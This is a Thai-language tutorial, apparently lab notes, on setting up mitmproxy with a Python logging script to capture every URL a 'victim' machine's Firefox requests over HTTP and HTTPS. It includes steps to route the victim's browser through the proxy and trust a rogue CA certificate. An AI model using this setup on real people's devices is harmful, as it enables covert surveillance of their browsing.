# PROXY
## MITM Proxy URL Capture (mitmproxy) - คู่มือฉบับมีภาพประกอบ

## 1. ข้อมูลทั่วไป
โปรเจกต์นี้ใช้ **mitmproxy** เพื่อดักจับ HTTP/HTTPS traffic ของเหยื่อ (ejb) ผ่าน proxy ของเครื่องโจมตี (MAX) และบันทึก **URL ของทุก request** ลงไฟล์ `captured_urls.txt`  

**Flow การทำงาน:**

เหยื่อ (ejb)
│ ผ่าน Proxy 8080
▼
เครื่องโจมตี (MAX) mitmproxy + capture.py
│
├─ Print URL บน Terminal
└─ Append URL ลง captured_urls.txt

---

## 2. ติดตั้ง mitmproxy

บนเครื่องโจมตี (MAX) ใช้คำสั่ง:
```bash
sudo apt update
sudo apt install mitmproxy -y
ตรวจสอบเวอร์ชัน:
mitmproxy --version
3. สร้าง Python Script สำหรับดัก URL
สร้างไฟล์ capture.py:
nano ~/capture.py
ใส่โค้ด:
from mitmproxy import http
import os
from datetime import datetime

output_file = os.path.expanduser("~/captured_urls.txt")

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    method = flow.request.method
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {method} {url}\n"
    
    # แสดง URL บน terminal
    print(line, end="")

    # append ลงไฟล์
    with open(output_file, "a") as f:
        f.write(line)
บันทึกไฟล์ด้วย Ctrl+O → Enter → Ctrl+X
4. รัน mitmdump พร้อม script
mitmdump -p 8080 -s ~/capture.py
-p 8080 → port proxy
-s ~/capture.py → script ดัก URL
กด Ctrl+C เพื่อหยุด mitmdump
ตัวอย่าง Terminal ขณะรัน:
[05:12:02] client connect
URL: [2025-08-16 05:12:02] GET https://zap.hackthebox.com/pusher/app/...
5. ตั้งค่า Proxy บนเหยื่อ (ejb)
Firefox → Preferences → Network Settings → Manual proxy configuration
ตั้งค่า:
HTTP Proxy: <IP MAX> Port: 8080
HTTPS Proxy: <IP MAX> Port: 8080
ติ๊ก Use this proxy for all protocols
6. ติดตั้ง Certificate ของ mitmproxy บน Firefox
ดาวน์โหลด cert จาก MAX:
mitmproxy --export-cert ~/mitmproxy-ca-cert.pem
Firefox → Privacy & Security → View Certificates → Import → เลือก mitmproxy-ca-cert.pem
ติ๊ก Trust this CA to identify websites → OK
7. ตรวจสอบการทำงาน
เปิดเว็บใด ๆ บนเหยื่อ → request จะผ่าน mitmproxy
บน MAX terminal จะเห็น URL print ออกมา
ตรวจสอบไฟล์ URL:
ls -l ~/captured_urls.txt
tail -f ~/captured_urls.txt
URL ใหม่จะ append ลงไฟล์ทันที
ตัวอย่าง output captured_urls.txt:
[2025-08-16 05:37:12] GET https://www.instagram.com/ajax/bz?__a=1...
[2025-08-16 05:37:15] GET https://th.linkedin.com/li/track
8. Tips & Tricks
filter เฉพาะ domain ที่สนใจ:
if "hackthebox.com" in url:
    with open(output_file, "a") as f:
        f.write(line)
บันทึก timestamp + method + URL ช่วยวิเคราะห์ traffic
ใช้ tail -f ~/captured_urls.txt | grep hackthebox → ดูเฉพาะ URL ของ HackTheBox
9. Flowchart การทำงาน
[เหยื่อ (ejb)]
       │
       │ HTTP/HTTPS Request ผ่าน Proxy 8080
       ▼
[เครื่องโจมตี (MAX)]
  ┌───────────────┐
  │ mitmdump      │
  │ + capture.py  │
  └───────────────┘
       │
 ┌─────┴─────┐
 │ Print URL │
 │ Append to │
 │ captured_ │
 │ urls.txt  │
 └───────────┘
10. สรุป
ตอนนี้คุณสามารถ:
รัน mitmproxy ดักจับ traffic ของเหยื่อ
แสดง URL แบบ real-time บน terminal
บันทึก URL ลงไฟล์ captured_urls.txt พร้อม timestamp และ HTTP method
ระบบพร้อมใช้งานเต็มที่สำหรับ การวิเคราะห์ traffic ของเหยื่อ ✅
